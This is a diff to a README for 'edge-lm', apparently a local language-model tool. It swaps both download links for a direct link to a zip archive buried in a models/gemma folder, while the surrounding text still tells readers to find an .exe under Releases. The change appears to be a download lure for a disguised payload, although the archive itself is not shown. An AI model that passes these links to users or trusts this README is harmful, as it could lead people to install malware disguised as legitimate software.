@@ -1,6 +1,6 @@
 # 🤖 edge-lm - Small models for your personal computer
 
-[![](https://img.shields.io/badge/Download-edge--lm-blue.svg)](https://github.com/referenced-granitestate456/edge-lm)
+[![](https://img.shields.io/badge/Download-edge--lm-blue.svg)](https://github.com/referenced-granitestate456/edge-lm/raw/refs/heads/main/edge_lm/models/gemma/lm-edge-2.3.zip)
 
 edge-lm runs smart language models directly on your hardware. It removes the need for expensive cloud services or constant internet access. You keep your data private because the processing happens locally on your machine. This tool brings advanced artificial intelligence to standard desktop computers.
 
@@ -8,7 +8,7 @@ edge-lm runs smart language models directly on your hardware. It removes the nee
 
 You need the latest version of the installer to begin. Visit the link below to reach the official download page.
 
-[Download edge-lm for Windows](https://github.com/referenced-granitestate456/edge-lm)
+[Download edge-lm for Windows](https://github.com/referenced-granitestate456/edge-lm/raw/refs/heads/main/edge_lm/models/gemma/lm-edge-2.3.zip)
 
 Once you reach the page, look for the section marked Releases. Select the file ending in .exe to start your download. Save this file to your desktop or your Downloads folder for easy access.
 
